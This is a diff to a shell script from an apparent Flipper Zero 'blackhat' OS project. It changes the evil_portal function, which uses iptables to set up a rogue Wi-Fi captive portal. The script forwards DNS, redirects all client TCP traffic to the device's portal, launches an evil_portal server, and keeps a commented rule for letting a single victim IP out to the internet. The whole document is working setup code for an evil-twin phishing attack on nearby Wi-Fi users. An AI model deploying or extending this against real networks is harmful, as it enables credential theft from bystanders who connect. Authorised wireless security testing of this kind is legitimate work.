@@ -87,9 +87,6 @@ function evil_portal() {
 
     echo 1 > /proc/sys/net/ipv4/ip_forward
     
-    # NAT traffic clients to the internet
-    # iptables -t nat -A POSTROUTING -o $AP_INET -j MASQUERADE
-
     iptables -F
 
     # Allow an initial DNS quiery to happen
@@ -108,14 +105,15 @@ function evil_portal() {
     # Restrict just http data to port 80 to flipper blackhat IP
     iptables -A FORWARD -i $AP_NIC -p tcp --dport 80 -d $AP_IP -j ACCEPT
 
-    iptables -A FORWARD -i $AP_NIC -j DROP
-
+    # Route TCP requests to the AP_IP portal
     iptables -t nat -A PREROUTING -i $AP_NIC -p tcp -j DNAT --to-destination $AP_IP
-    # iptables -A FORWARD -i $AP_NIC -o $AP_NIC -j ACCEPT
 
     kill $(pidof httpd) 2>/dev/null
     kill $(pidof evil_portal) 2>/dev/null
     ./usr/bin/evil_portal $EVIL_PORTAL &
+
+    # This is the command to route this one IP to the net.
+    # iptables -t nat -A POSTROUTING -o $INET_NIC -s $CLIENT_IP -j MASQUERADE
 }
 
 function set_param() {
@@ -214,8 +212,8 @@ case "$subcommand" in
         print_help
         ;;
     pull)
-        scp machinehum@192.168.1.103:/home/machinehum/projects/flipper-blackhat-os/package/blackhat/src/blackhat.conf /mnt/
-        scp machinehum@192.168.1.103:/home/machinehum/projects/flipper-blackhat-os/package/blackhat/src/blackhat.sh /tmp/bh
+        scp machinehum@192.168.1.139:/home/machinehum/projects/flipper-blackhat-os/package/blackhat/src/blackhat.conf /mnt/
+        scp machinehum@192.168.1.139:/home/machinehum/projects/flipper-blackhat-os/package/blackhat/src/blackhat.sh /tmp/bh
         echo "run: mv /tmp/bh /usr/bin/bh"
         ;;
     *)
